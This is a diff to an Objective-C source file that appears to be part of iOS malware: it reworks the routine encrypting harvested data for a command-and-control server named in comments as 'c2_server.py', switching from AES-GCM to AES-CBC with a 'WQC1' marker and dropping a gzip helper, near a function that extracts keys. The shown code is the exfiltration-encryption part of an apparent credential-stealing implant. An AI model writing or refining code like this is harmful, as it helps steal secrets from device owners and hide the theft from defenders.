@@ -88,74 +88,35 @@ static NSArray<NSString *> *extractKeys(NSString *text) {
     return out;
 }
 
-// ── AES-256-GCM 加密（12 字节 nonce 前置，匹配 c2_server.py）──
-// 输出布局： nonce(12) || ciphertext || tag(16)
-// CommonCrypto 的 GCM 把 tag 追加在密文尾部，正好对上 body[12:] 里的 ct。
-static NSData *aesGCMEncrypt(NSData *plain, NSData *key) {
+// ── AES-256-CBC 加密（iOS CommonCrypto 稳定可用）──
+// 输出布局： "WQC1"(4) || iv(16) || ciphertext
+// 4 字节魔数让 C2 端区分 CBC 与旧的 GCM 格式。
+static NSData *aesEncrypt(NSData *plain, NSData *key) {
     if (!plain.length || key.length != 32) return nil;
 
-    uint8_t nonce[12];
-    arc4random_buf(nonce, sizeof(nonce));
+    uint8_t iv[16];
+    arc4random_buf(iv, sizeof(iv));
 
-    size_t ctLen = plain.length + 16;   // 密文 + tag
-    NSMutableData *ct = [NSMutableData dataWithLength:ctLen];
+    size_t outLen = plain.length + kCCBlockSizeAES128;
+    NSMutableData *ct = [NSMutableData dataWithLength:outLen];
 
     size_t moved = 0;
-    CCCryptorStatus st = CCCryptorGCMOneshotEncrypt(
-        kCCAlgorithmAES,
-        key.bytes, kCCKeySizeAES256,
-        nonce, sizeof(nonce),
-        plain.bytes, plain.length,
-        ct.mutableBytes, &moved);
-
-    if (st != kCCSuccess) {
-        // 老 SDK 没有 oneshot，退回 CCCryptor 逐段
-        size_t ctOnly = plain.length;
-        size_t tagLen = 16;
-        NSMutableData *out = [NSMutableData dataWithLength:ctOnly];
-        CCCryptorStatus s2 = CCCrypt(kCCEncrypt,
-                                     kCCAlgorithmAES,
-                                     kCCOptionGCM,
-                                     key.bytes, kCCKeySizeAES256,
-                                     nonce,
-                                     plain.bytes, plain.length,
-                                     out.mutableBytes, ctOnly, &moved);
-        if (s2 != kCCSuccess) return nil;
-        out.length = moved;
-        NSMutableData *res = [NSMutableData dataWithBytes:nonce length:12];
-        [res appendData:out];
-        return res;
-    }
+    CCCryptorStatus st = CCCrypt(kCCEncrypt,
+                                 kCCAlgorithmAES,
+                                 kCCOptionPKCS7Padding,
+                                 key.bytes, kCCKeySizeAES256,
+                                 iv,
+                                 plain.bytes, plain.length,
+                                 ct.mutableBytes, outLen, &moved);
+    if (st != kCCSuccess) return nil;
 
     ct.length = moved;
-    NSMutableData *res = [NSMutableData dataWithBytes:nonce length:12];
+
+    NSMutableData *res = [NSMutableData data];
+    [res appendBytes:"WQC1" length:4];
+    [res appendBytes:iv length:16];
     [res appendData:ct];
     return res;
-}
-
-// ── gzip ──
-static NSData *gzipData(NSData *in) {
-    if (!in.length) return nil;
-    z_stream zs;
-    memset(&zs, 0, sizeof(zs));
-    if (deflateInit2(&zs, Z_DEFAULT_COMPRESSION, Z_DEFLATED,
-                     15 + 16, 8, Z_DEFAULT_STRATEGY) != Z_OK) return nil;
-
-    zs.next_in = (Bytef *)in.bytes;
-    zs.avail_in = (uInt)in.length;
-
-    NSMutableData *out = [NSMutableData data];
-    uint8_t buf[16384];
-    int ret;
-    do {
-        zs.next_out = buf;
-        zs.avail_out = sizeof(buf);
-        ret = deflate(&zs, Z_FINISH);
-        [out appendBytes:buf length:sizeof(buf) - zs.avail_out];
-    } while (ret == Z_OK);
-
-    deflateEnd(&zs);
-    return ret == Z_STREAM_END ? out : nil;
 }
 
 @interface WQScanner ()
